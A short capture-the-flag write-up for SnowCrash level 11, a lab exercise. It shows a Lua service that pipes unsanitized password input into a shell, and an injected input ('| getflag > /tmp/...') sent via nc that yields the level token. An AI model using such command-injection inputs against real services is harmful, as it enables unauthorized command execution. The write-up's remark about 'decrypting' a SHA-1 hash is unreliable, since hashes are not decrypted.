# level11

This one was way easier compared to the last one, we get a .lua file that we copy locally for analyzing and testing it.
After a little bit of time, we saw that:

```
prog = io.popen("echo "..pass.." | sha1sum", "r")
data = prog:read("*all")
```

Was probably the place for exploits. Using user input without sanitizing is always really risky. 
We then tried to inject some commands.

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: lala | getflag > /tmp/lala.txt
```

There is probably another way of solving this code since .lua code also got the hash of the password stored in the code clearly, using a shasum1 method of hashing, so there is probably a way of decrypting it.

```
/*********************************************************\

level11@SnowCrash:~$ cat /tmp/lala.txt 
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

\*********************************************************/
```